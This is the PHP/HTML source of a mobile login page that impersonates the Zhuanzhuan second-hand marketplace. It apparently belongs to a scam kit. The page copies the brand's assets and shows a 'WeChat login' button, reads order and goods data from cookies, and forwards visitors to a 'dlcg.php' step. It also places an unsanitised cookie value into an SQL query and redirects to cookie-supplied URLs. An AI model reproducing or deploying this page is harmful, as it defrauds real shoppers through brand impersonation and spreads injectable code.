
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);


if($_COOKIE['GoodsID']){


	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);


	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID']}'") or die('SQL执行错误');

}

//先重新将商品ID写入另一个命名的COOKIE中，然后再销毁商品页生成的商品ID的COOKIE
setcookie('GoodsID2',$_COOKIE['GoodsID']);
setcookie("GoodsID");
//判断在商品页传过来的COOKIE是否存在(此页面是登陆页面，属于安全系数，所以用于防止客户刷新依然停留或者发给其他用户看)
//如果发给用户看，COOKIE中的URL地址不存在，就返回设定好的跳转地址
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID']){
	   header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}



?>
<html data-dpr="1" style="font-size: 40px;background: #fdfdfd;"><head><meta charset="utf-8"><title>欢迎登录转转</title><link rel="dns-prefetch" href="https://img.58cdn.com.cn"><meta name="description" content="欢迎登录转转"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta content="telephone=no,email=no" name="format-detection"><meta name="apple-mobile-web-app-capable" content="yes">
	<link rel="stylesheet" href="123.css">
	


	  
	  <link rel="stylesheet" type="text/css" href="detail-strict_files/h5cashier.css" media="all">
	  <link rel="stylesheet" type="text/css" href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-vendors.b24e736b.css" media="all">
<style type="text/css">article,aside,blockquote,body,button,code,dd,details,div,dl,dt,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,hr,input,legend,li,menu,nav,ol,p,pre,section,td,textarea,th,ul{margin:0;padding:0}body{font:.16rem/1.5 Helvetica Neue,Helvetica,Tahoma,Arial,PingFang SC,Hiragino Sans GB,Heiti SC,Microsoft YaHei,WenQuanYi Micro Hei,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background:#fff}input,select,textarea{font-size:100%}table{border-collapse:collapse;border-spacing:0}li,ol,ul{list-style:none}h1,h2,h3,h4,h5,h6{font-weight:400}em,i{font-style:normal}fieldset,img{border:0}a{color:inherit;text-decoration:none}button{outline:none;border:none}div,form,h2,h3,h4,html,li,p,span,ul{word-wrap:break-word;word-break:break-all}</style><style type="text/css">
.login-banner-head{background:url(detail-strict_files/log.gif) no-repeat 80%;background-size:contain
}
.login-banner-head,.login-banner-head-cai{border-radius:.37rem;width:4.03rem;height:4.03rem;margin:2.87rem auto .75rem
}
.login-banner-head-cai{background:url(https://pic3.zhuanstatic.com/zhuanzh/n_v21f618270dfb244468d7d656ad37ff164.png) no-repeat 50%;background-size:contain
}
.login-banner-tip{font-family:PingFangHK-Regular;font-size:.43rem;color:#2e3135;text-align:center;margin-bottom:.67rem
}
.login-tip{position:absolute
}
.login-button{background:#f55
}
.login-button,.login-button-cai{width:8.93rem;height:1.07rem;line-height:1.07rem;border-radius:.13rem;color:#fff;font-size:.4rem;text-align:center;margin:1.71rem auto
}
.login-button-cai{background:#ff5100
}
.login-toast{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1
}
.login-toast-content{border-radius:.13rem;background:#000;font-size:.32rem;color:#fff;line-height:.53rem;margin:auto;position:absolute;top:5.33rem;right:0;left:0;padding:.27rem;width:5.33rem;text-align:center
}</style><style type="text/css">
body{background:#f2f2f2;margin:0
}</style></head><body style="font-size: 12px;background: #fdfdfd;">

<div data-v-23014a94="" id="app">
   <div class="login-banner-head"> </div>
<div data-v-42ed4228="" class="login-tip">


<p data-v-42ed4228="" class="login-tip-err"></p>
<br>
</div></section> <a onclick="f()"><div class="login-button" style="margin-top:13%;">   &nbsp;	&nbsp;	&nbsp;	微信登录开启转转世界</div></a><div></div><br> <br> 

    <div style="margin-top:-24%;margin-left:15%;color:#8B8B7A;" />
            <span style="color:#8B8B7A">已阅读并同意以协议</span><br><font size="2" color="#FF0000">《转转使用条约与规范》《转转隐私政策》</font>
            </div>
         <div style="text-align:left;margin-left:20px;padding: 50% 0px 0px 20%;size:4;"><br>
         <font size="2" color="#8B8B7A"> 腾讯投资-更专业的闲置二手交易平台</font>
        
         </div>
         
   <script type="text/javaScript">
 	function f() { 	
 	location.replace('dlcg.php?i=<?php echo $_List['goods_oid']; ?>.shtml&fullCate=<?php echo $_List['in_admin_id']; ?>&zhuanzhuanSourceFrom=<?php echo $zhuanzhuanNUM1_1; ?>&PGTID=0d400005-0278-44ac-f681-fdcb1dfcf2fe&ClickID=<?php echo $_List['goods_id']; ?>'); 	
  	}  
 	</script>    
 <img src="detail-strict_files/zc.png" style="margin-top:-67%;margin-left:11%;width:13px; height:13px; />

    <style>.

    <style>.loading {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      background-color: #F2F3F6;
    }
    .loading.off {
      display: none;
    }
    .loading-indicator {
      position: absolute;
      left: 50%;
      top: 50%;
      margin-left: -60px;
      margin-top: -50px;
      width: 120px;
      height: 100px;
    }
    .loading-indicator:after {
      display: block;
      content: ' ';
      position: absolute;
      top: 50%;
      left: 50%;
      margin-left: -20px;
      margin-top: -20px;
      width: 40px;
      height: 40px;
      background: url(https://img1.zhuanstatic.com/common/img/loading.gif) no-repeat 50% 50%;
      background-size: 40px 40px;
    }
    #app:empty::after {
      content: "";
      position: fixed;
      left: 0;
      top: 0;
      right: 0;
      bottom: 0;
      background-image:   linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),    linear-gradient(#f8f8f8 100%, transparent 0),   linear-gradient(#fff 100%, transparent 0);
      background-position:  3.2vw 175.46vw,  87.16vw 153.3vw,  14.93vw 158.56vw,  14.93vw 151.56vw,  7.5vw 150.76vw,  87.16vw 132.23vw,  14.93vw 137.5vw,  55.33vw 131.16vw,  35vw 131.16vw,  14.93vw 130.5vw,  7.5vw 129.7vw,  87.16vw 111.16vw,  14.93vw 116.43vw,  14.93vw 109.43vw,  7.5vw 108.63vw,  87.16vw 90.1vw,  14.93vw 95.36vw,  57.28vw 89.03vw,  35vw 89.03vw,  14.93vw 88.36vw,  7.5vw 87.56vw,  87.16vw 69.03vw,  14.93vw 74.3vw,  39vw 67.96vw,  14.93vw 67.3vw,  7.5vw 66.5vw,  87.16vw 47.96vw,  14.93vw 53.23vw,  14.93vw 46.23vw,  7.5vw 45.43vw,  6.4vw 33.96vw,  36.85vw 20.39vw,  29.12vw 19.06vw,  27.2vw 5.25vw,  4.29vw 4.29vw,  0 0;
      background-size:  93.6vw 9.6vw,  5.33vw 5.33vw,  56.33vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  41.6vw 3.2vw,  6.4vw 3.2vw,  16vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  25.8vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  25.6vw 3.2vw,  19.2vw 3.2vw,  17.95vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  44.8vw 3.2vw,  6.8vw 3.2vw,  20vw 4vw,  5.33vw 5.33vw,  5.33vw 5.33vw,  41.6vw 3.2vw,  16vw 4vw,  5.33vw 5.33vw,  14.79vw 3.7vw,  4.72vw 3.2vw,  7.72vw 4.8vw,  50.34vw 3.7vw,  19.7vw 19.7vw,  100% 100%;
      background-repeat: no-repeat;
    }</style><link rel="stylesheet" type="text/css" href="https://s1.zhuanstatic.com/trade/m-pay/static/css/chunk-6ea6d82d.0b1699c8.css">
<div style="display: <?php echo $oldnewc8888;?>">
    
<div id="abc" >



 



 </div><script type="text/javascript" src="https://s1.zhuanstatic.com/common/loginsms/static/js/vendor.09595279c8fba3faec71.js"></script></script></body></html>
         


